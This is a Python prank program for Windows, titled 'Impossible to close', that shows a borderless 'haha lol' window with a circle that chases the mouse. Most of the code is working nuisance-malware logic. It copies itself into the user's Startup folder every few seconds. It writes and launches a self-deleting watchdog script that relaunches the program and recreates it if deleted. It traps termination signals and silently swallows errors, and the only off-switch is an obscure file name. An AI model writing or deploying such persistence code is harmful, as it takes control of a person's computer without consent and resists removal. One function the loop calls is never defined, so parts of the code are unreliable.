import os
import sys
import time
import shutil

def copy_to_appdata(force=False):
    path = '%s/Microsoft/Windows/Start Menu/Programs/Startup/%s' %(os.getenv('APPDATA'), os.path.basename(__file__))
    if not os.path.exists(path) or os.path.getsize(__file__) != os.path.getsize(path) or force:
        if os.path.exists(path):
            os.remove(path)
        shutil.copy(__file__, os.path.dirname(path))
copy_to_appdata(True)

run = False # False: will start launch.pyw
if os.path.exists('launch_is_running'):
    os.remove('launch_is_running')
    time.sleep(1)
    if os.path.exists('launch_is_running'): # launch.pyw is running correctly
        run = True # True: just run the program at the end

with open('app_is_running', 'w') as f:
    f.write('lol')

if not run:
    with open(__file__) as f:
        content = f.read()
    with open('launch.pyw', 'w') as f:
        f.write('''import os
import os
import sys
import time
import signal

def regen_file(): # tell the main file to run instead of creating a new launch.pyw
    if not os.path.exists('launch_is_running'):
        with open('launch_is_running', 'w') as f:
            f.write('never gonna give you up')

def regen_main_file(): # recreate the main file if deleted
    if not os.path.exists(main_file_path):
        with open(main_file_path, 'w') as f:
            f.write(main_file_content)

def handler(signum, frame): # called when closed
    os.remove('launch_is_running')

regen_file()
if os.path.exists('launch.pyw'): # remove itself after launching
    os.remove('launch.pyw')
if os.path.exists('app_is_running'):
    os.remove('app_is_running')

# get signals to launch a kill handler
for n in dir(signal):
    if n.startswith('SIG') and not n.startswith('SIG_'):
        signal.signal(getattr(signal, n), handler)

def run():
    while True:
        try:
            if not os.path.exists('app_is_running'):
                if not os.path.exists(main_file_path):
                    regen_main_file()
                os.startfile('"%%s"' %%main_file_path)
                start = time.time()
                while not os.path.exists('app_is_running') and time.time()-start < 5:
                    regen_check_file()
                    time.sleep(0.1)
            regen_file()
            regen_main_file()

            if os.path.exists('polochon.xdf'): # why this name? Idk, just used a random word
                os.remove('polochon.xdf')
                return

            time.sleep(0.5)
        except: # something went wrong, please remove this when debugging
            pass

# to recreate the main file if needed
main_file_path = r'%s'
main_file_content = \"\"\"%s\"\"\"
run()
''' %(os.path.abspath(__file__), content))
    os.startfile('launch.pyw')
    sys.exit()

import win32api
import win32con
import win32gui
import pygame
from pygame.locals import *
from pygame.math import Vector2
from threading import Thread

def top_bar():
    pygame.draw.rect(screen, (255, 255, 255), Rect((0, 0), (WIDTH, 30)))
    pygame.draw.rect(screen, (0, 0, 0), Rect((7, 7), (15, 15)))
    screen.blit(font.render('Impossible to close', True, (0, 0, 0)), (29, 8))
    pygame.draw.line(screen, (0, 0, 0), (WIDTH-30, 10), (WIDTH-20, 20), 2)
    pygame.draw.line(screen, (0, 0, 0), (WIDTH-30, 20), (WIDTH-20, 10), 2)
    pygame.draw.line(screen, (200, 200, 200), (WIDTH-65, 10), (WIDTH-65, 19))
    pygame.draw.line(screen, (200, 200, 200), (WIDTH-65, 10), (WIDTH-74, 10))
    pygame.draw.line(screen, (200, 200, 200), (WIDTH-65, 19), (WIDTH-74, 19))
    pygame.draw.line(screen, (200, 200, 200), (WIDTH-74, 10), (WIDTH-74, 19))
    pygame.draw.line(screen, (0, 0, 0), (WIDTH-120, 15), (WIDTH-110, 15))

pygame.init()

WIDTH, HEIGHT = (640, 480)
screen = pygame.display.set_mode((WIDTH, HEIGHT), NOFRAME)
pygame.display.set_caption('Impossible to close')
clock = pygame.time.Clock()
font = pygame.font.SysFont('calibri', 14)
big_font = pygame.font.SysFont('comic sans ms', 100)

hwnd = pygame.display.get_wm_info()['window']
win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_LAYERED)
win32gui.SetLayeredWindowAttributes(hwnd, win32api.RGB(0, 255, 0), 0, win32con.LWA_COLORKEY)

pos = Vector2()
speed = Vector2()

time_passed = 0
last = 0 # timer to copy to appdata again
while True:
    for event in pygame.event.get():
        if event.type == QUIT:
            if os.path.exists('app_is_running'):
                os.remove('app_is_running')
            # remove the file so that even with task manager killing the process,
            # launch.pyw will still create another file
            pygame.quit()
            sys.exit()

    # if launch.pyw has been closed, reopen it by launching itself once more
    if not os.path.exists('launch_is_running'):
        os.startfile(__file__)
        sys.exit()
    if time.time()-last > 5:
        copy_to_appdata()
        last = time.time()

    screen.fill((0, 0, 0))
    top_bar()
    text = big_font.render('haha lol', False, (0, 255, 0))
    w, h = text.get_size()
    screen.blit(text, (WIDTH//2-w//2, HEIGHT//2+15-h//2))

    speed += (Vector2(pygame.mouse.get_pos())-pos)*time_passed*500
    speed *= 0.8**(100*time_passed)
    pos += speed*time_passed
    pygame.draw.circle(screen, (0, 255, 0), pos, 30)

    pygame.display.flip()
    time_passed = clock.tick(120)/1000
